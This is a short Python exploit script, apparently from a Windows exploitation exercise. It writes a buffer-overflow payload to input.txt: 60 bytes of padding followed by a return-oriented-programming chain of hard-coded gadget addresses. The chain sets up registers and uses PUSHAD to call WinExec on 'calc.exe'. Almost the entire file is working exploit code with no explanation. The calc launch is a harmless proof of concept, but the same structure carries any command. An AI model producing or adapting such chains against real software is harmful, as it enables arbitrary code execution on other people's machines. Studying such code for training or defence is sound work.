import struct

# ROP chain
def create_rop_chain():
    rop_gadgets = [
        0x636c6163,     # calc.exe
        0x6578652e,     # 
        0x00000020,     # 
        # calc.exe into ebx
        0x0140f942,     # pop ebx # retn
        0x0019FF14,     # the address of calc.exe into ebx
        # 5 into edx
        0x0140e3f8,     # pop edx # retn
        0x00000005,     # 5 into edx
        # ecx - nothing
        0x01406e0e,     # pop ecx #retn
        0x01406e0f,     # retn
        ###########        
        0x0140356c,     # pop eax # pop edi # pop esi # pop ebp # retn
        0x01406e0f,     # retn eax
        0x01406e0f,     # retn edi
        0x01406e0f,     # retn esi
        
        0x7624D380,     # WinExec addr
        
        #PUSHAD 
        0x01401a93,     # PUSHAD # inc ecx # add esi, esi # retn  
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets )

###################################################################
payload = ""
payload += 'A' * 60 # 32 + 16 + 8 + 4
payload += create_rop_chain()

f = open("C:\\Users\\IEUser\\Desktop\\input.txt", "w")
f.write(payload)
f.close()

